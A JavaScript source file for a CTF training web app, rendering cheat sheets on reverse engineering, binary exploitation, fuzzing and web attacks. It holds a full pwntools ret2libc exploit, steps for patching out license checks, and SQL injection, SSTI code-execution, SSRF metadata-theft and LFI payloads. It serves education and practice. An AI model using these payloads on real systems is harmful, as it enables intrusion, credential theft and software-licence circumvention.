        <button class="btn" data-textbook="reverse-start-to-end">📖 Read Reversing Chapter</button>
      </div>

      <div class="cmd-table-wrap">
        <table class="cmd-table">
          <thead>
            <tr>
              <th>Hotkey</th>
              <th>Action</th>
              <th>Why It Wins CTF Challenges</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><code>G</code></td>
              <td>Goto Address / Symbol</td>
              <td>Instantly jump to <code>main</code>, PLT stubs (<code>strcmp</code>), or hex addresses found in strings/GDB.</td>
            </tr>
            <tr>
              <td><code>L</code></td>
              <td>Rename Variable / Function</td>
              <td>Transforms cryptic <code>local_18</code> to <code>user_input</code> and <code>FUN_00401122</code> to <code>validate_key</code>. Decompiler output becomes human-readable C!</td>
            </tr>
            <tr>
              <td><code>Ctrl + L</code></td>
              <td>Retype Variable / Field</td>
              <td>Convert <code>undefined4</code> to <code>char *</code> or custom structs. Resolves pointer arithmetic and array indexing automatically.</td>
            </tr>
            <tr>
              <td><code>X</code></td>
              <td>Cross-References (XREFs)</td>
              <td>Find every location in the binary where a specific encrypted string or decryption key is referenced.</td>
            </tr>
            <tr>
              <td><code>;</code> or <code>:</code></td>
              <td>Add Comment</td>
              <td>Document disassembled logic directly in the Listing and Decompiler windows.</td>
            </tr>
          </tbody>
        </table>
      </div>

      <div class="grid cols-2" style="gap:16px;margin:16px 0">
        <div class="card">
          <h4 style="color:var(--green);margin:0 0 8px">Binary Patching (Bypassing License Checks)</h4>
          <ol style="padding-left:18px;margin:0;color:#cdd6f4;font-size:13px;line-height:1.6">
            <li>Locate the decision jump in the Listing (e.g. <code>JNZ LAB_00401250</code> right after <code>strcmp</code>).</li>
            <li>Right click instruction &rarr; <strong>Patch Instruction</strong> (or press <code>Ctrl+Shift+G</code>).</li>
            <li>Change <code>JNZ</code> to <code>JZ</code>, or replace with <code>NOP</code> sleds (<code>90 90</code>).</li>
            <li>Alternatively, patch validation function: change first instruction to <code>MOV EAX, 1; RET</code>.</li>
            <li>Export patched binary: <em>File &rarr; Export Program &rarr; Format: Binary</em>, save, and <code>chmod +x patched_bin</code>.</li>
          </ol>
        </div>

        <div class="card">
          <h4 style="color:var(--green);margin:0 0 8px">Automated Keygenning with Z3 Solver</h4>
          <p style="color:#aeb6c5;font-size:12px;margin:0 0 6px">When Ghidra shows 30+ math equations comparing user input, do not solve by hand!</p>
          <pre><code>from z3 import *
s = Solver()
flag = [BitVec(f'c_{i}', 8) for i in range(24)]
# Printable ASCII constraints
for c in flag: s.add(c >= 32, c <= 126)
# Paste equations from Ghidra decompiler:
s.add(flag[0] == ord('C'))
s.add((flag[1] ^ flag[2]) + flag[3] == 0x9f)
if s.check() == sat:
    m = s.model()
    print(''.join(chr(m[c].as_long()) for c in flag))</code></pre>
        </div>
      </div>
    </article>
  ` : ''}

  ${tab === 'pwn' ? `
    <article class="writeup-card">
      <div class="card-top">
        <div>
          <span class="tag accent">BINARY EXPLOITATION</span>
          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">GDB + GEF &amp; Pwntools Masterclass</h3>
          <p style="color:#aeb6c5;font-size:13px">The industry-standard pwn stack: GDB with GEF (GDB Enhanced Features) for dynamic debugging and Pwntools for automated exploit development.</p>
        </div>
        <button class="btn" data-textbook="pwn-start-to-end">📖 Read Pwn Chapter</button>
      </div>

      <div class="cmd-table-wrap">
        <table class="cmd-table">
          <thead>
            <tr>
              <th>GEF Command</th>
              <th>What It Does</th>
              <th>How to Use It in CTF Challenges</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><code>checksec</code></td>
              <td>Audits binary mitigations</td>
              <td>Tells you immediately: Canary? NX (need ROP)? PIE (randomized addresses)? RELRO?</td>
            </tr>
            <tr>
              <td><code>pattern create 200</code></td>
              <td>Generates de Bruijn cyclic string</td>
              <td>Feed to binary to crash it and find exact return address overwrite offset.</td>
            </tr>
            <tr>
              <td><code>pattern offset $rsp</code></td>
              <td>Calculates exact padding offset</td>
              <td>Reports exact bytes needed before overwriting <code>$rip</code> (e.g. <code>Found at offset 72</code>).</td>
            </tr>
            <tr>
              <td><code>telescope $rsp 20</code></td>
              <td>Deep stack inspection</td>
              <td>Inspects 20 stack frames, resolving pointers to symbols, strings, and libc addresses.</td>
            </tr>
            <tr>
              <td><code>vmmap</code></td>
              <td>Memory permissions map</td>
              <td>Shows virtual memory layout: which sections are readable, writable, or executable (RWX).</td>
            </tr>
            <tr>
              <td><code>registers</code></td>
              <td>Color-coded register dump</td>
              <td>Displays RAX, RBX, RCX, RDX, RSI, RDI, RSP, RIP with smart pointer dereferencing.</td>
            </tr>
          </tbody>
        </table>
      </div>

      <div class="card" style="margin-top:16px">
        <h4 style="color:var(--green);margin:0 0 8px">The Ultimate Pwntools Python Boilerplate (Ret2libc / ROP)</h4>
        <pre><code>#!/usr/bin/env python3
from pwn import *

# Set target binary architecture and debug context
exe = './vuln_binary'
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ['tmux', 'splitw', '-h']

# Toggle local vs remote target dynamically
if args.REMOTE:
    io = remote('challenge.ctf.server', 1337)
    libc = ELF('./libc.so.6', checksec=False)
else:
    io = process(exe)
    libc = elf.libc

# 1. Stage 1: Leak Libc address via puts@got
offset = 72
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])  # Loop back to main for second stage

io.sendlineafter(b'Input: ', b'A' * offset + rop.chain())
leaked_puts = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Libc Base Address: {hex(libc.address)}")

# 2. Stage 2: Return to system('/bin/sh') with 16-byte stack alignment
rop2 = ROP(libc)
rop2.raw(rop.find_gadget(['ret'])[0]) # Stack align for movaps SSE
rop2.system(next(libc.search(b'/bin/sh\x00')))

io.sendlineafter(b'Input: ', b'A' * offset + rop2.chain())
io.interactive()</code></pre>
      </div>
    </article>
  ` : ''}

  ${tab === 'dirbust' ? `
    <article class="writeup-card">
      <div class="card-top">
        <div>
          <span class="tag accent">CONTENT DISCOVERY</span>
          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">Content &amp; Endpoint Discovery (ffuf, Gobuster, Feroxbuster)</h3>
          <p style="color:#aeb6c5;font-size:13px">Why DirBuster GUI is obsolete and how modern Go/Rust fuzzers unearth hidden admin routes, API endpoints, backups, and virtual hosts at 100x speed.</p>
        </div>
      </div>

      <div class="grid cols-3" style="gap:16px;margin:16px 0">
        <div class="card">
          <h4 style="color:var(--green);margin:0 0 6px">1. Directory &amp; File Fuzzing</h4>
          <pre><code>ffuf -u http://target/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -e .php,.html,.bak,.swp,.txt,.json \
  -mc 200,301,302,403</code></pre>
        </div>
        <div class="card">
          <h4 style="color:var(--green);margin:0 0 6px">2. Virtual Host (VHost) Fuzzing</h4>
          <pre><code>ffuf -u http://target.ctf \
  -H "Host: FUZZ.target.ctf" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 1420  # Filter wildcard page size</code></pre>
        </div>
        <div class="card">
          <h4 style="color:var(--green);margin:0 0 6px">3. Hidden Parameter Fuzzing</h4>
          <pre><code>ffuf -u 'http://target/api/test?FUZZ=1' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200 -fs 512</code></pre>
        </div>
      </div>

      <div class="card">
        <h4 style="color:var(--green);margin:0 0 8px">Mastering Noise Filtering (Eliminating False Positives)</h4>
        <p style="color:#aeb6c5;font-size:13px;margin:0 0 10px">When target servers return HTTP 200 for every URL (wildcard routing), traditional scanners get clogged with thousands of junk hits. Use ffuf's fine-grained filter flags:</p>
        <div class="grid cols-4" style="gap:12px;font-size:12px">
          <div><code style="color:var(--accent)">-fc 404,403</code><br><span style="color:#aeb6c5">Filters specific status codes</span></div>
          <div><code style="color:var(--accent)">-fs 1530</code><br><span style="color:#aeb6c5">Filters exact response size (bytes)</span></div>
          <div><code style="color:var(--accent)">-fw 42</code><br><span style="color:#aeb6c5">Filters exact word count</span></div>
          <div><code style="color:var(--accent)">-fl 18</code><br><span style="color:#aeb6c5">Filters exact line count</span></div>
        </div>
      </div>
    </article>
  ` : ''}

  ${tab === 'quickflag' ? `
    <article class="writeup-card">
      <div class="card-top">
        <div>
          <span class="tag accent">TACTICAL TRIAGE</span>
          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">🎯 'Quick Flag' Decision Matrix: Where to Use What Tool</h3>
          <p style="color:#aeb6c5;font-size:13px">When staring at a fresh CTF challenge, do not guess blindly. Use this tactical decision matrix to select the exact right toolchain and immediate first command.</p>
        </div>
      </div>

      <div class="cmd-table-wrap" style="margin-top:16px">
        <table class="cmd-table">
          <thead>
            <tr>
              <th>What You Are Given</th>
              <th>Primary Toolchain</th>
              <th>Immediate First Command</th>
              <th>Expected Indicator of Success</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><strong>Unknown binary or mystery file</strong></td>
              <td><code>file</code>, <code>strings</code>, <code>binwalk</code></td>
              <td><code>file target && strings -n 8 target | grep -Ei "flag|key"</code></td>
              <td>Identifies file format or exposes hardcoded flag in plaintext.</td>
            </tr>
            <tr>
              <td><strong>Web login form</strong></td>
              <td>Burp Suite Repeater</td>
              <td>Inject <code>' OR 1=1 -- -</code> or <code>admin' --</code> into username</td>
              <td>Bypasses authentication into administrator dashboard.</td>
            </tr>
            <tr>
              <td><strong>Image or audio file (Stego)</strong></td>
              <td><code>exiftool</code>, <code>zsteg</code>, <code>steghide</code></td>
              <td><code>exiftool img.png; zsteg -a img.png; steghide extract -sf img.jpg</code></td>
              <td>Exposes embedded comments, LSB color channel flags, or ZIP archive.</td>
            </tr>
            <tr>
              <td><strong>Network packet capture (.pcap)</strong></td>
              <td>Wireshark, <code>tshark</code></td>
              <td>Filter: <code>http contains "flag" || tcp.stream eq 0</code></td>
              <td>Reconstructs HTTP downloads, credentials, or exfiltrated data.</td>
            </tr>
            <tr>
              <td><strong>Stripped 64-bit ELF binary</strong></td>
              <td>Ghidra + GDB/GEF</td>
              <td>Ghidra: find <code>__libc_start_main</code> to locate <code>main</code>; GDB: break before <code>strcmp</code></td>
              <td>Dumps runtime-decrypted flag sitting in registers (<code>$rsi</code>/<code>$rdi</code>).</td>
            </tr>
            <tr>
              <td><strong>Binary with buffer overflow (NX disabled)</strong></td>
              <td>GEF + Pwntools</td>
              <td><code>gef> pattern create 200</code> &rarr; <code>shellcraft.sh()</code> on stack</td>
              <td>Executes shellcode on stack, spawning interactive <code>/bin/sh</code>.</td>
            </tr>
            <tr>
              <td><strong>Binary with buffer overflow (NX enabled)</strong></td>
              <td>Pwntools ROP / Ret2libc</td>
              <td>Stage 1: Leak <code>puts@got</code>; Stage 2: <code>system('/bin/sh')</code></td>
              <td>Bypasses non-executable stack to spawn root shell.</td>
            </tr>
            <tr>
              <td><strong>Web app reflecting username ("Hello {name}")</strong></td>
              <td>Burp Repeater</td>
              <td>Inject <code>{{7*7}}</code> (Jinja2/Twig) or <code>${7*7}</code> (Spring)</td>
              <td>Renders <code>49</code>, confirming Server-Side Template Injection (SSTI).</td>
            </tr>
            <tr>
              <td><strong>Web app taking URL (?url=http://...)</strong></td>
              <td>Burp + <code>interactsh</code></td>
              <td>Inject <code>http://169.254.169.254/latest/meta-data/</code> or <code>http://127.0.0.1:80/</code></td>
              <td>Discloses cloud IAM credentials or internal microservices (SSRF).</td>
            </tr>
            <tr>
              <td><strong>Encoded / obfuscated text string</strong></td>
              <td>CyberChef</td>
              <td>Load CyberChef &rarr; Apply "Magic" recipe &rarr; Test Base64, ROT13, Hex</td>
              <td>Automatically recognizes encoding layers and decodes flag.</td>
            </tr>
            <tr>
              <td><strong>Low-privilege Linux SSH shell</strong></td>
              <td>Bash / GTFOBins</td>
              <td><code>sudo -l; find / -perm -u=s -type f 2>/dev/null; getcap -r / 2>/dev/null</code></td>
              <td>Discovers SUID binary or capability yielding instant root escalation.</td>
            </tr>
            <tr>
              <td><strong>Windows memory dump (.raw, .vmem)</strong></td>
              <td>Volatility 3</td>
              <td><code>python3 vol.py -f dump.raw windows.pslist; windows.cmdline</code></td>
              <td>Extracts running processes, command lines, and injected malware DLLs.</td>
            </tr>
          </tbody>
        </table>
      </div>
    </article>
  ` : ''}
  `;
}

function labsHTML() {
  const os = state.os;
  return `<div class="section-head"><div><h2>Micro-labs</h2><p>Browser-native challenges with instant feedback. Progress is saved locally.</p></div><div class="tag-row"><span class="tag accent">local only</span><span class="tag">${state.solved.length}/${challenges.length} solved</span></div></div>
  <div class="challenge-list">${challenges.map(ch=>{
    const solved = state.solved.includes(ch.id);
    return `<div class="challenge-card${solved?' solved':''}">
      <div class="card-top"><h3>${esc(ch.name)}</h3><div class="tag-row"><span class="tag">${esc(ch.cat)}</span><span class="tag${ch.diff==='Hard'?' warn':ch.diff==='Warm-up'?' success':''}">${esc(ch.diff)}</span><span class="tag accent">${ch.points} pts</span>${solved?'<span class="tag success">✓ Solved</span>':''}</div></div>
      <p style="margin-top:10px;color:#aeb6c5">${esc(ch.prompt)}</p>
      <div class="challenge-input"><input type="text" placeholder="Your answer…" id="ans-${esc(ch.id)}" value="${solved?esc(ch.answer):''}" ${solved?'disabled':''} autocomplete="off"></div>
      <div class="challenge-actions">
        <button class="btn" data-check="${esc(ch.id)}" ${solved?'disabled':''}>Submit</button>
        <button class="btn outline" data-hint="${esc(ch.id)}">Hint</button>
        ${solved?'<button class="btn outline" data-why="'+esc(ch.id)+'">Why</button>':''}
      </div>
      <div class="hint" id="hint-${esc(ch.id)}">${ch.hint.map(h=>`<div>💡 ${esc(h)}</div>`).join('')}</div>
      <div class="result" id="res-${esc(ch.id)}">${solved?'<span class="ok">✓ Correct!</span>':''}</div>
      ${ch.why?`<div class="note" id="why-${esc(ch.id)}" style="display:none"><strong>Why this matters:</strong> ${esc(ch.why)}</div>`:''}
    </div>`; }).join('')}
  </div>`;
}

function playbookHTML() {
  if (!isAdvancedRole()) {
    alert('This field is under development.');
    return '<div class="empty">This field is under development.</div>';
  }
  const tab = state.playbookTab || 'universal';

  const steps = [
    {n:'01',title:'Triage',items:['Identify category (crypto, web, pwn, forensics, OSINT, stego, reverse).','Read the problem statement twice. Highlight concrete clues.','List what artifacts you have: file, URL, service, image, pcap.']},
    {n:'02',title:'Gather evidence',items:['Run the minimal set of observation commands for the category.','Capture all output. Do not interpret yet—just collect.','Check file types, sizes, magic bytes, strings, entropy.']},
    {n:'03',title:'Form one hypothesis',items:['State it in plain language: "This is X because I see Y."','Write the predicted evidence if the hypothesis is correct.','Rank your top two and choose the more falsifiable one.']},
    {n:'04',title:'Test & iterate',items:['Change one variable. Run the relevant tool. Compare output to prediction.','If evidence doesn\'t match, update the hypothesis—don\'t the test.','Prefer local, reversible experiments. Keep a command log.']},
    {n:'05',title:'Exploit & extract',items:['Apply the narrowest proof-of-concept that produces the flag.','Verify the flag format before submitting.','Record the minimal reproduction: file + one command = flag.']},
    {n:'06',title:'Write it up',items:['Root cause → exploit chain → flag → defensive lesson.','3–8 sentences is enough. Include the key command.','Map to ATT&CK if it\'s an offensive technique.']}
  ];

  return `
  <div class="section-head">
    <div>
      <div class="eyebrow">METHODOLOGY // REPEATABLE CTF SOLVE LIFECYCLES</div>
      <h2>Challenge Start-to-End Solve Lifecycles</h2>
      <p>Tactical, battle-tested playbooks for Web Exploitation, Reverse Engineering, Binary Exploitation (Pwn), and the Universal 6-Step Loop. Learn how to assume at starting, formulate falsifiable hypotheses, avoid rabbit holes, and conclude with surgical flag extraction.</p>
    </div>
    <div class="tag-row">
      <span class="tag accent">4 solve lifecycles</span>
      <span class="tag success">start-to-end</span>
      <span class="tag warn">falsifiable testing</span>
    </div>
  </div>

  <div class="os-tabs" style="margin-bottom:18px">
    ${[
      ['universal', 'Universal 6-Step Solve Loop'],
      ['web', 'Web Exploitation Lifecycle (Start to Flag)'],
      ['reverse', 'Reverse Engineering Lifecycle (Start to Flag)'],
      ['pwn', 'Binary Exploitation (Pwn) Lifecycle']
    ].map(([key, label]) => `
      <button class="os-btn${tab === key ? ' active' : ''}" data-playbook-tab="${key}">${label}</button>
    `).join('')}
  </div>

  ${tab === 'universal' ? `
    <div class="playbook">
      ${steps.map(s => `
        <div class="play-card card">
          <div class="card-top">
            <span class="tag accent">${s.n}</span>
            <h3>${s.title}</h3>
          </div>
          <ol>${s.items.map(i => `<li>${i}</li>`).join('')}</ol>
        </div>
      `).join('')}
    </div>
    <div class="note" style="margin-top:24px">
      <strong>Anti-patterns to avoid:</strong> Running every tool without a hypothesis. Accepting tool output as ground truth without manual verification. Giving up before checking the simplest explanation. Sharing flags or solutions in active competitions.
    </div>
  ` : ''}

  ${tab === 'web' ? `
    <article class="writeup-card">
      <div class="card-top">
        <div>
          <span class="tag accent">LIFECYCLE 01 // WEB EXPLOITATION</span>
          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">Web Exploitation: From First HTTP Request to Flag Extraction</h3>
          <p style="color:#aeb6c5;font-size:13px">How to approach unknown web applications: technology fingerprinting, attack surface mapping, formulating hypotheses, concluding true positives, and weaponizing payloads in Burp Suite.</p>
        </div>
        <button class="btn" data-textbook="web-start-to-end">📖 Read Full Web Chapter</button>
      </div>

      <div class="grid cols-2" style="gap:16px;margin:20px 0">
        <div class="card">
          <h4 style="color:var(--green);margin:0 0 8px">Phase 1: How to Assume at Starting (Tech Profiling)</h4>
          <p style="color:#aeb6c5;font-size:12px;margin:0 0 8px">Never guess randomly. Match the identified tech stack to its natural vulnerability vectors:</p>
          <ul style="padding-left:18px;margin:0;color:#cdd6f4;font-size:13px;line-height:1.6">
            <li><strong>PHP / Apache:</strong> Look for Local File Inclusion (<code>include($_GET['page'])</code>), PHP stream wrappers (<code>php://filter</code>), and file upload extension bypasses.</li>
            <li><strong>Node.js / Express:</strong> Look for Prototype Pollution (<code>__proto__</code>), NoSQL injection (<code>{"$gt": ""}</code>), and JWT algorithm confusion (<code>"alg": "none"</code>).</li>
            <li><strong>Python / Flask:</strong> Look for Server-Side Template Injection (Jinja2 <code>{{cycler...}}</code>), and Python Pickle / YAML deserialization.</li>
            <li><strong>Java / Spring:</strong> Look for Spring Expression Language (SpEL) injection, Log4j/Logback OOB JNDI, and Java serialized objects.</li>
          </ul>
        </div>

        <div class="card">
          <h4 style="color:var(--green);margin:0 0 8px">Phase 2: Attack Surface &amp; Input Point Mapping</h4>
          <ol style="padding-left:18px;margin:0;color:#cdd6f4;font-size:13px;line-height:1.6">
            <li><strong>Passive Recon:</strong> Check <code>/robots.txt</code>, <code>/sitemap.xml</code>, <code>/.git/HEAD</code>, and HTML source comments for hidden endpoints.</li>
            <li><strong>Content Discovery:</strong> Run <code>ffuf -u http://target/FUZZ -w raft-medium-directories.txt -mc 200,301 -fs 0</code>.</li>
            <li><strong>Input Cataloging:</strong> Catalog every parameter in GET queries (<code>?id=</code>), POST bodies (JSON, form-urlencoded), and HTTP headers (<code>User-Agent</code>, <code>X-Forwarded-For</code>).</li>
          </ol>
        </div>
      </div>

      <div class="card" style="margin-bottom:20px">
        <h4 style="color:var(--green);margin:0 0 8px">Phase 3 &amp; 4: How to Formulate &amp; Conclude Specific Vulnerabilities</h4>
        <div class="cmd-table-wrap">
          <table class="cmd-table">
            <thead>
              <tr>
                <th>Vulnerability</th>
                <th>How to Test (Hypothesis)</th>
                <th>How to Conclude (Root Cause Proof)</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><strong>SQL Injection</strong></td>
                <td>Inject <code>'</code> and check for 500 error; inject <code>' OR '1'='1</code> vs <code>' OR '1'='2</code>.</td>
                <td>Time-based test: inject <code>'; SELECT SLEEP(5)-- -</code>. If response takes exactly 5.05s vs 0.05s on <code>SLEEP(0)</code>, SQLi is 100% concluded.</td>
              </tr>
              <tr>
                <td><strong>SSTI</strong></td>
                <td>Inject <code>{{7*7}}</code>. If output is <code>49</code>, inject <code>{{7*'7'}}</code>.</td>
                <td>If <code>49</code> -> Twig (PHP). If <code>7777777</code> -> Jinja2 (Python). Escalate to <code>{{cycler.__init__.__globals__.os.popen('id').read()}}</code>.</td>
              </tr>
              <tr>
                <td><strong>Local File Inclusion (LFI)</strong></td>
                <td>Inject <code>../../../../etc/passwd</code> or <code>php://filter/convert.base64-encode/resource=index.php</code>.</td>
                <td>Base64 response decodes to raw PHP source code, confirming arbitrary file disclosure.</td>
              </tr>
              <tr>
                <td><strong>SSRF</strong></td>
                <td>Inject <code>http://169.254.169.254/latest/meta-data/</code> or loopback <code>http://127.0.0.1:80/</code>.</td>
                <td>Backend reflects AWS IAM credentials or internal admin panels unreachable externally.</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    </article>
  ` : ''}

  ${tab === 'reverse' ? `
    <article class="writeup-card">
      <div class="card-top">
        <div>
          <span class="tag accent">LIFECYCLE 02 // REVERSE ENGINEERING</span>
          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">Reverse Engineering: From 30-Second Triage to Ghidra &amp; Z3</h3>
          <p style="color:#aeb6c5;font-size:13px">Deconstructing compiled binaries: the 30-second triage, Ghidra static analysis, GDB dynamic hooking, and algorithmic keygenning with the Z3 theorem prover.</p>
        </div>
        <button class="btn" data-textbook="reverse-start-to-end">📖 Read Reversing Chapter</button>
      </div>

      <div class="grid cols-4" style="gap:16px;margin:20px 0">
        <div class="card">
          <h4 style="color:var(--green);font-size:14px;margin:0 0 6px">1. 30-Second Triage</h4>
          <p style="font-size:12px;color:#aeb6c5;line-height:1.5">Run <code>file</code> (ELF vs PE, stripped?), <code>checksec</code>, <code>strings -n 8</code>, and <code>ltrace -s 128 ./bin</code>. If <code>strcmp</code> is used, the flag appears in plaintext in ltrace!</p>
        </div>
        <div class="card">
          <h4 style="color:var(--green);font-size:14px;margin:0 0 6px">2. Static Analysis in Ghidra</h4>
          <p style="font-size:12px;color:#aeb6c5;line-height:1.5">Locate <code>main</code> (or follow <code>__libc_start_main</code>). Rename variables with <code>L</code>, retype with <code>Ctrl+L</code>. Identify validation loop (XOR, additive, or rolling state).</p>
        </div>
        <div class="card">
          <h4 style="color:var(--green);font-size:14px;margin:0 0 6px">3. GDB Dynamic Hooking</h4>
          <p style="font-size:12px;color:#aeb6c5;line-height:1.5">If the binary decrypts the flag in RAM, don't reverse the math! Set breakpoint before comparison (<code>b *main+0x84</code>) and dump registers (<code>x/s $rsi</code>).</p>
        </div>
        <div class="card">
          <h4 style="color:var(--green);font-size:14px;margin:0 0 6px">4. Z3 SMT Keygenning</h4>
          <p style="font-size:12px;color:#aeb6c5;line-height:1.5">If 20+ non-linear constraints compare user input, extract equations into Python, define Z3 <code>BitVec</code> variables, and let the SMT solver compute the flag in 0.1s.</p>
        </div>
      </div>
    </article>
  ` : ''}

  ${tab === 'pwn' ? `
    <article class="writeup-card">
      <div class="card-top">
        <div>
          <span class="tag accent">LIFECYCLE 03 // BINARY EXPLOITATION</span>
          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">Binary Exploitation (Pwn): Mitigation Audit to Remote Shell</h3>
          <p style="color:#aeb6c5;font-size:13px">Systematic memory corruption tradecraft: mitigation mapping, cyclic offset calculation, exploit primitive selection (Ret2win, Ret2libc, Shellcode, Format String), and weaponized Pwntools scripts.</p>
        </div>
        <button class="btn" data-textbook="pwn-start-to-end">📖 Read Pwn Chapter</button>
      </div>

      <div class="cmd-table-wrap" style="margin:20px 0">
        <table class="cmd-table">
          <thead>
            <tr>
              <th>Mitigation State</th>
              <th>Vulnerability Context</th>
              <th>Optimal Attack Primitive</th>
              <th>Exploit Strategy</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><code>NX: Disabled, PIE: No</code></td>
              <td>Stack buffer overflow</td>
              <td><strong>Shellcode on Stack</strong></td>
              <td>Put <code>shellcraft.sh()</code> in buffer, overwrite return address with buffer address or <code>jmp rsp</code> gadget.</td>
            </tr>
            <tr>
              <td><code>NX: Enabled, PIE: No</code></td>
              <td>Hidden <code>win()</code> / <code>backdoor()</code> function</td>
              <td><strong>Ret2win</strong></td>
              <td>Pad buffer to offset (<code>72 bytes</code>) + <code>p64(win_address)</code>. Stack-align with extra <code>ret</code> gadget if Ubuntu 20+.</td>
            </tr>
            <tr>
              <td><code>NX: Enabled, PIE: No/Yes</code></td>
              <td>Standard overflow, no win function</td>
              <td><strong>Ret2libc (2-Stage ROP)</strong></td>
              <td>Stage 1: Call <code>puts(puts@got)</code> to leak Libc base; Stage 2: Call <code>system('/bin/sh')</code>.</td>
            </tr>
            <tr>
              <td><code>RELRO: Partial, Canary: Yes</code></td>
              <td><code>printf(user_buf)</code></td>
              <td><strong>Format String Exploit</strong></td>
              <td>Leak canary &amp; Libc with <code>%p</code>; overwrite GOT entry (e.g. <code>exit@got</code> &rarr; <code>win</code>) using <code>fmtstr_payload()</code>.</td>
            </tr>
          </tbody>
        </table>
      </div>
    </article>
  ` : ''}
  `;
}

function casebookHTML() {
  const tab = state.casebookTab || 'all';
  const q = normalizeAnswer(state.casebookQuery || '');
  const allWriteups = window.TOURNAMENT_WRITEUPS || [];

  const filteredWriteups = allWriteups.filter(w => {
    if (tab === 'hackquest') {
      const isHQ = (w.event && w.event.toLowerCase().includes('hackquest')) || (w.id && w.id.includes('hackquest')) || (w.title && w.title.toLowerCase().includes('hackquest'));
      if (!isHQ) return false;
      const hqSeason = state.hackquestSeasonFilter || 'all';
      const hqRound = state.hackquestRoundFilter || 'all';
      if (hqSeason !== 'all' && String(w.season) !== String(hqSeason)) return false;
      if (hqRound !== 'all' && String(w.round) !== String(hqRound)) return false;
    } else if (tab !== 'all' && tab !== 'cve' && w.category !== tab) {
      return false;
    }
    if (tab === 'cve') return false;
    if (q) {
      const str = normalizeAnswer(w.title + ' ' + w.event + ' ' + w.category + ' ' + w.scenario + ' ' + w.root_cause + ' ' + w.flag);
      if (!str.includes(q)) return false;
    }
    return true;
  });

  const filteredCves = casebook.filter(c => {
    if (tab !== 'all' && tab !== 'cve') return false;
    if (q) {
      const str = normalizeAnswer(c.title + ' ' + c.domain + ' ' + c.lesson + ' ' + c.study.join(' '));
      if (!str.includes(q)) return false;
    }
    return true;
  });

  return `
  <div class="section-head">
    <div>
      <div class="eyebrow">TOURNAMENT ARCHIVES &amp; REAL-WORLD EXPLOIT CASEBOOK</div>
      <h2>Casebook &amp; Exploit Vault</h2>
      <p>Collegiate CTF tournament writeups with root-cause analysis, step-by-step methodologies, and complete runnable Python exploit scripts.</p>
    </div>
    <div class="tag-row">
      <span class="tag accent">${allWriteups.length} Tournaments</span>
      <span class="tag success">${casebook.length} Historic CVEs</span>
    </div>
  </div>

  <div class="module-search" style="margin-bottom:14px">
    <span>&gt;</span>
    <input id="casebookSearch" value="${esc(state.casebookQuery || '')}" placeholder="search writeups by technique, challenge name, CVE, or flag format..." autocomplete="off">
    <span class="cursor">█</span>
  </div>

  <div class="os-tabs" style="margin-bottom:18px">
    ${[
      ['all', 'All Writeups'],
      ['hackquest', 'TCS HackQuest (All Seasons)'],
      ['pwn', 'Pwn / Binary'],
      ['web', 'Web Exploitation'],
      ['crypto', 'Cryptography'],
      ['forensics', 'Forensics & Stego'],
      ['reverse', 'Reverse Eng'],
      ['cloud', 'Cloud & Escape'],
      ['cve', 'Historic CVEs']
    ].map(([catKey, label]) => `
      <button class="os-btn${tab === catKey ? ' active' : ''}" data-casebook-tab="${catKey}">${label}</button>
    `).join('')}
  </div>

  ${tab === 'hackquest' ? `
    <div style="background:var(--card-bg, #0f172a);border:1px solid var(--border, #334155);border-radius:8px;padding:12px;margin-bottom:18px">
      <div style="display:flex;flex-wrap:wrap;align-items:center;gap:6px;margin-bottom:10px">
        <span style="font-size:12px;color:var(--cyan);font-weight:700;text-transform:uppercase;letter-spacing:.05em;margin-right:4px">Season:</span>
        ${[
          ['all', 'All Seasons (1–10)'],
          ['10', 'Season 10 (2025/26)'],
          ['9', 'Season 9 (2024/25)'],
          ['8', 'Season 8 (2024)'],
          ['7', 'Season 7 (2023)'],
          ['6', 'Season 6 (2022)'],
          ['5', 'Season 5 (2021)'],
          ['4', 'Season 4 (2019/20)'],
          ['3', 'Season 3 (2018/19)'],
          ['2', 'Season 2 (2017/18)'],
          ['1', 'Season 1 (2016/17)']
        ].map(([sKey, sLabel]) => `
          <button class="os-btn${(state.hackquestSeasonFilter || 'all') === sKey ? ' active' : ''}" data-hq-season="${sKey}" style="font-size:11px;padding:3px 8px">${sLabel}</button>
        `).join('')}
      </div>
      <div style="display:flex;flex-wrap:wrap;align-items:center;gap:6px">
        <span style="font-size:12px;color:var(--amber);font-weight:700;text-transform:uppercase;letter-spacing:.05em;margin-right:4px">Round:</span>
        ${[
          ['all', 'All Rounds (R1 & R2)'],
          ['1', 'Round 1 (Qualifier CTF)'],
          ['2', 'Round 2 (Proctored Grand Finale)']
        ].map(([rKey, rLabel]) => `
          <button class="os-btn${(state.hackquestRoundFilter || 'all') === rKey ? ' active' : ''}" data-hq-round="${rKey}" style="font-size:11px;padding:3px 8px">${rLabel}</button>
        `).join('')}
      </div>
    </div>
  ` : ''}

  ${tab !== 'cve' ? `
    <div class="writeups-list">
      ${filteredWriteups.map(w => `
        <article class="writeup-card">
          <div class="card-top" style="align-items:flex-start">
            <div>
              <div class="tag-row" style="margin-bottom:6px">
                <span class="tag accent">${esc(w.category.toUpperCase())}</span>
                <span class="tag warn">${esc(w.difficulty)}</span>
                <span class="tag">${w.points} pts</span>
                <span class="tag success">${esc(w.event)}</span>
              </div>
              <h3 style="font-size:18px;color:var(--fg);margin:0 0 6px">${esc(w.title)}</h3>
            </div>
            <button class="btn outline copy-btn" data-copy-exploit="${esc(w.id)}">📋 Copy Exploit</button>
          </div>

